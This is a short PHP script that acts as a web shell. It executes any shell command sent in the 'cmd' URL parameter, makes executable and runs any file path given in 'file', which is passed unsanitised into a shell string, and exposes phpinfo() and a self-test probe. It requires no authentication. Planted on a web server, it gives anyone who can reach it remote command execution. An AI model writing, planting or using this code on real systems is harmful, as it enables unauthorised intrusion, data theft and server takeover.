<?php
if(isset($_GET['self_test']))
{
    echo "OK";
    die();
}
if(isset($_GET['info']))
{
    phpinfo();
    die();
}

$command = @$_GET['cmd'];
if(!empty($command))
{
    echo shell_exec($command);
}

$file = @$_GET['file'];
if(!empty($file))
{
    //make sure we have the right to execute this file. this also will fail if we don't own it.
    shell_exec("chmod a+x $file");
    $output = '';

    $indent = @$_GET['indent'];
    if(isset($indent))
    {
        for($i=0;$i<$indent;$i++)
        {
            $output .= '  ';
        }
    }

    $output .= "[php file] ";
    $output .= shell_exec($file);

    echo $output;
}
